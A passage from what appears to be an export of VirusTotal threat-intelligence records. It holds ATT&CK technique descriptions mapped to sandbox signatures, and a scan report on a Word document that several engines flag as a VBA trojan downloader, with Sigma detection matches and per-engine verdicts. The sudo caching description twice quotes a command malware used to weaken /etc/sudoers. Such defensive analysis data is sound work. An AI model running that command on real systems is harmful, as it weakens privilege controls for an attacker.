                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the sysctl hardware model value (might be used for detecting VM presence)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1573/",
                "id": "T1573",
                "name": "Encrypted Channel"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\nThe sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL. Elevated privileges are required to edit this file though.\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.\nIn the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers. In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"sudo\" command used to execute a command as another user"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1548/003/",
                "id": "T1548.003",
                "name": "Sudo and Sudo Caching"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Found strings indicative of a multi-platform dropper"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"rm\" command used to delete files or directories"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/004/",
                "id": "T1070.004",
                "name": "File Deletion"
              },
              {
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. \nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"kill\" or \"pkill\" command typically used to terminate processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1562/001/",
                "id": "T1562.001",
                "name": "Disable or Modify Tools"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the sysctl hardware model value (might be used for detecting VM presence)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\nThe sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL. Elevated privileges are required to edit this file though.\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.\nIn the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers. In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"sudo\" command used to execute a command as another user"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1548/003/",
                "id": "T1548.003",
                "name": "Sudo and Sudo Caching"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/0cc60a0c480e4d898fa77ab501bbd2afaf3f5fb89a2917a31e7f5fdaa6c3879c/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "6596a6ee06bafd61c48fcc63"
  },
  "data": {
    "attributes": {
      "type_description": "MS Word Document",
      "tlsh": "T1DAC2FA0FB9B9CA14F24586300E57C5CA30AA7F18AB509687635F3F2CB8782727725787",
      "vhash": "b92dcc9ae1a8ec74dff0375d5630f769",
      "type_tags": [
        "document",
        "msoffice",
        "text",
        "word",
        "doc"
      ],
      "creation_date": 1700576820,
      "names": [],
      "last_modification_date": 1703783685,
      "type_tag": "doc",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 27136,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.genw/ole2",
        "popular_threat_category": [
          {
            "count": 6,
            "value": "trojan"
          },
          {
            "count": 4,
            "value": "downloader"
          }
        ],
        "popular_threat_name": [
          {
            "count": 2,
            "value": "genw"
          },
          {
            "count": 2,
            "value": "ole2"
          },
          {
            "count": 2,
            "value": "urtbadur"
          }
        ]
      },
      "last_submission_date": 1700563193,
      "sigma_analysis_results": [
        {
          "rule_title": "Suspicious New Instance Of An Office COM Object",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-8950-655C-5106-000000004800}",
                "ProcessId": "5508",
                "Product": "Microsoft Office 2016",
                "Description": "Microsoft Word",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-2313-6538-1000-000000004800}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=CE33FC3C687D3C01159A8CAEA7F5482E,SHA256=5D75D0EA8BBB5B652F7B72CF728C00322BD486D54A5C4978CEACDF70B4317EE6,IMPHASH=1B2B96B0763DACAFA277667CA093F96D",
                "OriginalFileName": "WinWord.exe",
                "ParentImage": "C:\\Windows\\System32\\svchost.exe",
                "FileVersion": "16.0.4266.1001",
                "ParentProcessId": "876",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "CommandLine": "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /Automation -Embedding",
                "EventID": "1",
                "LogonGuid": "C784477D-2318-6538-1795-030000000000",
                "LogonId": "234775",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                "IntegrityLevel": "High",
                "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
                "UtcTime": "1700563280",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "ffbbcedfb9a1fd41ebb288154c10cf5cf869eb25195708be30f8a9df74f411cc",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "rule_description": "Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.\nThis can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)\n"
        },
        {
          "rule_title": "Office Macro File Creation",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TargetFilename": "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Templates\\~$Normal.dotm"
              }
            }
          ],
          "rule_level": "low",
          "rule_id": "27801b0f98df1ce7686b07b693c59e734c47189ef3db24ea1093f6f00ff2ed67",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "rule_description": "Detects the creation of a new office macro files on the systems"
        },
        {
          "rule_title": "Modification of IE Registry Settings",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "%HTTP_PROXY%:8080",
                "TargetObject": "HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "46 00 00 00 04 01 00 00 03 00 00 00 14 00 00 00 65 78 74 72 61 63 74 6F 72 2E 70 72 6F 78 79 3A 38 30 38 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D0 5C 01 4D C1 D5 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
                "TargetObject": "HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\SavedLegacySettings"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "网络  10",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\{7075633A-6CA2-4EE1-B9C0-7C6AE06D763D}\\WpadNetworkName"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\DefaultConnectionSettings"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "{7075633A-6CA2-4EE1-B9C0-7C6AE06D763D}",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\\WpadLastNetwork"
              }
            }
          ],
          "rule_level": "low",
          "rule_id": "7ca43f2acf2c039e776af286dca2b5216d23967e6e8fe43dd5a5cc95f86e52e5",
          "rule_author": "frack113",
          "rule_description": "Detects modification of the registry settings used for Internet Explorer and other Windows components that use these settings. An attacker can abuse this registry key to add a domain to the trusted sites Zone or insert javascript for persistence"
        }
      ],
      "reputation": 0,
      "trid": [
        {
          "file_type": "Microsoft Word document",
          "probability": 52.6
        },
        {
          "file_type": "Microsoft Word document (old ver.)",
          "probability": 33.3
        },
        {
          "file_type": "Generic OLE2 / Multistream Compound",
          "probability": 14
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 0,
          "medium": 1,
          "critical": 0,
          "low": 2
        }
      },
      "sandbox_verdicts": {
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        },
        "DOCGuard": {
          "category": "malicious",
          "sandbox_name": "DOCGuard",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "1e931660cce69add24e405c9fbdd3072190c9f716c1675334f00d0bdbf84bf46",
      "type_extension": "doc",
      "tags": [
        "doc",
        "calls-wmi"
      ],
      "last_analysis_date": 1703776467,
      "unique_sources": 1,
      "first_submission_date": 1700563193,
      "ssdeep": "192:lQ+lH5BsWiYEYITlR3uimLuslLZEvA+6/6rT5bk8xgNAOR6A5MSRL:e+lH5BvEzOF8iSY5UA51",
      "md5": "efd493e8ebcd66f9404338532519eb90",
      "sha1": "877f95ee15adb5540d0b50509a14d1cdf89fe3e1",
      "magic": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.2, Code page: 1252, Template: temp.dot, Revision Number: 1, Name of Creating Application: Microsoft Office Word, Create Time/Date: Tue Nov 21 14:27:00 2023, Last Saved Time/Date: Tue Nov 21 14:27:00 2023, Number of Pages: 2, Number of Words: 364, Number of Characters: 2075, Security: 0",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 15,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 10,
        "undetected": 51
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "Artemis!Trojan",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.132.50559",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.132.50559",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231127"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.607",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Trojan.Mdropper",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28476",
          "result": "VBA/TrojanDownloader.Agent.ZHH",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.483",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.OLE2.UrtBadur.genw",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-12-28.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5021",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan-Downloader.VBA.Agent",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37055B:27.34361",
          "result": "Generic.Trojan.Agent.J0PC5E",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.153.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36296",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "DOC.S.Downloader.27136.A",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "ZoneAlarm": {
